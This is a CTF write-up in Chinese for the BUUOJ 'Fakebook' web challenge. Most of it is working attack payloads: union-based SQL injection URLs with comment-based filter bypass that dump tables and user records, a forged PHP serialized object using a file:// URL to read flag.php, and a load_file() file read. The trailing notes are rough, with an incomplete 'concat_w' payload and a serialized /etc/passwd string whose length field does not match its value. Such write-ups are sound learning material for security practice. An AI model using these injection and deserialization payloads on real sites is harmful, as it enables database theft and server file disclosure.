# Fakebook

考点：SQL 注入、源码泄漏、反序列化

### 信息搜集

* 登陆注册
* 注册需要输入博客 URL（联想到 SSRF）
* view.php 可以注入
* 存在 user.php.bak
* 存在 flag.php
* 页面会报错，WEB目录为 /var/www/html/

### 利用

1. 通过注入拿到数据库中的数据
2. [http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/\*\*/unIon/\*\*/seleCt/\*\*/33,group\_concat\(table\_name\),55,66 from information\_schema.tables where table\_schema=database\(\)%23](http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/**/unIon/**/seleCt/**/33,group_concat%28table_name%29,55,66%20from%20information_schema.tables%20where%20table_schema=database%28%29%23)

users

* [http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/\*\*/unIon/\*\*/seleCt/\*\*/33,group\_concat\(column\_name\),55,66 from information\_schema.columns limit 0,10%23](http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/**/unIon/**/seleCt/**/33,group_concat%28column_name%29,55,66%20from%20information_schema.columns%20limit%200,10%23)

no,username,passwd,data

* [http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/\*\*/unIon/\*\*/seleCt/\*\*/33,concat\_ws\(no,%27\|%27,username,%27\|%27,passwd,%27\|%27,data\),55,66 from users%23](http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/**/unIon/**/seleCt/**/33,concat_ws%28no,%27|%27,username,%27|%27,passwd,%27|%27,data%29,55,66%20from%20users%23)
* 发现存在序列化的数据

```text
O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:3;s:4:"blog";s:16:"http://baidu.com";}
```

猜测该页面会把查询出来的内容进行反序列化 因此我们为了读取 flag，可以直接通过注入构造一个序列化的数据

```text
O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:3;s:4:"blog";s:16:"file:///var/www/html/flag.php";}
```

```text
http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/**/unIon/**/seleCt/**/33,44,55,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:1:%221%22;s:3:%22age%22;i:3;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27
```

### 非预期

直接使用注入点读取 flag

[http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/\*\*/unIon/\*\*/seleCt/\*\*/1,load\_file\(%27/var/www/html/flag.php%27\),3,4%23](http://1eb82f8a-5494-47fc-88af-8bdd6e607c1f.node3.buuoj.cn/view.php?no=0/**/unIon/**/seleCt/**/1,load_file%28%27/var/www/html/flag.php%27%29,3,4%23)

[http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/\*\*/union/\*\*/select/\*\*/1,group\_concat\(table\_name\),3,4/\*\*/from/\*\*/information\_schema.tables/\*\*/where/\*\*/table\_schema=database\(\)/\*\*/order/\*\*/by/\*\*/1/\*\*/%23](http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/**/union/**/select/**/1,group_concat%28table_name%29,3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database%28%29/**/order/**/by/**/1/**/%23)

[http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/\*\*/union/\*\*/select/\*\*/1,group\_concat\(column\_name\),3,4/\*\*/from/\*\*/information\_schema.columns/\*\*/where/\*\*/table\_name='users'/\*\*/order/\*\*/by/\*\*/1/\*\*/%23](http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/**/union/**/select/**/1,group_concat%28column_name%29,3,4/**/from/**/information_schema.columns/**/where/**/table_name='users'/**/order/**/by/**/1/**/%23)

blog, no,username,passwd,data

[http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/\*\*/union/\*\*/select/\*\*/1,concat\_w,3,4/\*\*/from/\*\*/information\_schema.columns/\*\*/where/\*\*/table\_name='users'/\*\*/order/\*\*/by/\*\*/1/\*\*/%23](http://f9d6421e-4a3e-4d96-a24b-d22ecaf15cce.node3.buuoj.cn/view.php?no=2/**/union/**/select/**/1,concat_w,3,4/**/from/**/information_schema.columns/**/where/**/table_name='users'/**/order/**/by/**/1/**/%23)

file:///

O:8:"UserInfo":3:{s:4:"name";s:3:"wyh";s:3:"age";i:1;s:4:"blog";s:16:"file:///etc/passwd";}

php 序列化数据

